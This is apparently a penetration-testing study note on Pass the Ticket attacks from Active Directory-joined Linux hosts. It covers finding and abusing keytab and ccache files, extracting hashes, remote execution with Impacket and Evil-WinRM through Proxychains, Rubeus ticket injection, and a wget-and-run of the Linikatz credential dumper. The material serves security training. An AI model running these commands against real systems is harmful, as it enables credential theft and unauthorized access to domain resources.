---
title: "Pass the Ticket (PtT) from Linux"
date: 2026-08-06 10:00:00 -0300
categories: [Concepts, Linux]
tags: [linux, kerberos, pass-the-ticket, overpass-the-hash, keytab, ccache, impacket, evil-winrm, linikatz]
---

Linux systems joined to **Active Directory** commonly use **Kerberos** for centralized authentication, allowing users to access both Linux and Windows resources with a single identity. If such a system is compromised, attackers may search for stored Kerberos tickets in different locations to impersonate users and perform **Pass the Ticket (PtT)** attacks.

Linux and Windows use the same Kerberos authentication process, but they differ in how Kerberos tickets are stored. On most Linux systems, Kerberos tickets are saved as **ccache** files, typically in the `/tmp` directory, with their location referenced by the `KRB5CCNAME` environment variable. Users with elevated or root privileges can access these ticket files and potentially use them in **Pass the Ticket (PtT)** attacks. Linux systems may also use **keytab** files, which store Kerberos principals and encrypted keys to enable passwordless authentication. Keytab files are commonly used by automated scripts and services to authenticate to Kerberos-protected resources without requiring user interaction.

The `realm list` command can be used to determine whether a Linux system is joined to an **Active Directory** domain and to display Kerberos configuration details, including the domain name and permitted users or groups. If the `realm` tool is unavailable, the presence of services such as **SSSD** or **Winbind** can also indicate Active Directory integration. Identifying a domain-joined Linux system is an important step when assessing Kerberos authentication and potential **Pass the Ticket (PtT)** opportunities.

```bash
realm list
ps -ef | grep -i "winbind\|sssd"
```

## Finding Keytab Files

Keytab files can often be discovered by searching the filesystem for filenames containing **`keytab`**, as administrators commonly use the `.keytab` extension for Kerberos authentication files. These files require appropriate read permissions to be used and may also be referenced in automated scripts, such as **cron jobs**, where commands like `kinit` authenticate service accounts without requiring a plaintext password. Analyzing these scripts can reveal both the location of keytab files and the identities of the accounts they authenticate.

```bash
find / -name *keytab* -ls 2>/dev/null
crontab -l
```

Once a valid keytab is obtained, it can be imported into the current session with `kinit` to request a **Ticket Granting Ticket (TGT)** and impersonate the associated user or service account. In addition to user and service account keytabs, Linux domain-joined systems maintain a machine account keytab at **`/etc/krb5.keytab`**, which is typically accessible only by the root user. If this file is compromised, an attacker can authenticate as the computer account and interact with Active Directory using its identity.

## Abusing Keytab Files

A **keytab** file can be used to impersonate the account it was created for by requesting Kerberos tickets without knowing the account's password. The `klist -k` command identifies the principal stored in the keytab, while `kinit -k -t <keytab>` loads the keytab and requests a **Ticket Granting Ticket (TGT)** for that account. After authentication, `klist` can be used to verify that the current Kerberos ticket now belongs to the impersonated user.

Once the ticket is loaded, Kerberos-aware tools such as `smbclient` can authenticate automatically, allowing access to resources authorized for the impersonated account, such as SMB shares. Since `kinit` replaces the current Kerberos credentials in the active session, it is recommended to back up the existing **ccache** file referenced by the `KRB5CCNAME` environment variable before importing a new keytab, preserving the original authentication context.

## Keytab Extraction

Besides impersonating users, **keytab** files can also be used to extract Kerberos authentication secrets. Tools such as [KeyTabExtract](https://github.com/sosdave/KeyTabExtract) parse a keytab file and recover valuable information, including the Kerberos realm, service principal, and authentication material such as **NTLM**, **AES-128**, and **AES-256** hashes. These extracted credentials can then be leveraged for further attacks.

```bash
python3 /opt/keytabextract.py /opt/specialfiles/<USER>.keytab
```

The recovered **NTLM** hash can be used directly in **Pass the Hash (PtH)** attacks, while the **AES** keys can be used for **OverPass the Hash (Pass the Key)** attacks or cracked to recover the plaintext password. A single keytab file may contain multiple credentials and different encryption types, potentially belonging to multiple accounts. Password recovery can be attempted with tools such as **Hashcat** or **John the Ripper**, or by checking online password databases if appropriate, like [CrackStation](https://crackstation.net/).

Once the plaintext password is recovered, the attacker can authenticate directly as the compromised user and obtain a valid Kerberos session. This process can be repeated with additional keytab files, such as those referenced in scheduled tasks or cron jobs, enabling attackers to compromise service accounts and continue escalating privileges or moving laterally throughout the Active Directory environment.

## Finding ccache Files

A **ccache** file stores a user's valid Kerberos tickets after authentication and is typically referenced by the `KRB5CCNAME` environment variable, which Kerberos-enabled tools use to locate the credential cache. On most Linux systems, these files are stored in the **`/tmp`** directory and remain valid for the duration of the user's session.

```bash
env | grep -i krb5
ls -la /tmp | grep krb5
```

By inspecting environment variables or searching the `/tmp` directory, attackers can identify active ccache files belonging to logged-in users. If an attacker gains root or other privileged access, they can reuse these valid Kerberos tickets to impersonate users and perform **Pass the Ticket (PtT)** attacks without needing the users' passwords.

## Abusing ccache Files

A **ccache** file can be abused whenever an attacker has read access to it, which typically requires **root** or equivalent privileges on a Linux system. After gaining elevated privileges, an attacker can enumerate the **`/tmp`** directory to identify active Kerberos credential caches, determine their owners, and inspect group memberships to identify high-value targets such as **Domain Admins**. Once a valuable ccache file is found, it can be copied and loaded into the current session by setting the `KRB5CCNAME` environment variable, allowing Kerberos-enabled tools to authenticate as the ticket's owner.

After importing the ccache, tools such as `klist` can verify the loaded ticket and confirm its validity period before use. If the ticket is still valid, the attacker can access Kerberos-protected resources, such as SMB shares, without knowing the user's password, effectively performing a **Pass the Ticket (PtT)** attack. Because ccache files are temporary and expire when their associated Kerberos tickets become invalid or users log out, attackers must verify the ticket's expiration time before relying on it for authentication.

## Using Linux Attack Tools with Kerberos

Many Linux offensive tools, such as **Impacket** and [Evil-WinRM](https://github.com/Hackplayers/evil-winrm), support Kerberos authentication through existing Kerberos tickets. When running these tools from a domain-joined Linux machine, the `KRB5CCNAME` environment variable must point to the desired **ccache** file so the tools can authenticate using the stored ticket. If the attack host is **not** joined to the domain, it must still be able to communicate with the **KDC (Domain Controller)** and resolve domain hostnames correctly.

In environments where direct connectivity to the KDC is unavailable, attackers can tunnel traffic through a compromised host using [Chisel](https://github.com/jpillora/chisel) and route Kerberos traffic with [Proxychains](https://github.com/haad/proxychains). Additionally, the `/etc/hosts` file can be modified to manually resolve domain names and domain controllers. After importing a valid **ccache** file and configuring `KRB5CCNAME`, Kerberos-aware tools such as Impacket and Evil-WinRM can authenticate without requiring the user's password.

```bash
export KRB5CCNAME=/home/user/<CCACHE_FILE>
```

```bash
proxychains impacket-wmiexec dc01 -k -no-pass
proxychains evil-winrm -i dc01 -r inlanefreight.htb
```

### Impacket Ticket Converter

**Impacket** includes the `ticketConverter` utility, which converts Kerberos tickets between the Linux **ccache** format and the Windows **.kirbi** format. This allows Kerberos tickets captured on one operating system to be reused on the other, making it easier to perform **Pass the Ticket (PtT)** attacks across different platforms.

After converting a ticket to the appropriate format, it can be imported into the target operating system using native tools. For example, a **.kirbi** ticket can be injected into a Windows session with **Rubeus**, after which the ticket becomes immediately available for Kerberos authentication.

```bash
impacket-ticketConverter <CCACHE_FILE> <USER>.kirbi
```

```powershell
Rubeus.exe ptt /ticket:c:\tools\<USER>.kirbi
```

### Linikatz

[Linikatz](https://github.com/CiscoCXSecurity/linikatz) is a post-exploitation tool for Linux that performs a role similar to **Mimikatz** on Windows, targeting systems integrated with **Active Directory**. It requires **root privileges** and extracts Kerberos credentials, keytabs, cached tickets, machine account secrets, and other authentication artifacts from implementations such as **SSSD**, **Samba**, and **FreeIPA**.

The extracted credentials are organized into output files, including **ccache** and **keytab** formats, which can then be reused in attacks such as **Pass the Ticket (PtT)**, **Pass the Key (OverPass the Hash)**, or impersonation with `kinit`. This makes Linikatz a valuable tool for collecting Kerberos credentials from compromised Linux systems.

```bash
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
chmod +x linikatz.sh
sudo ./linikatz.sh
```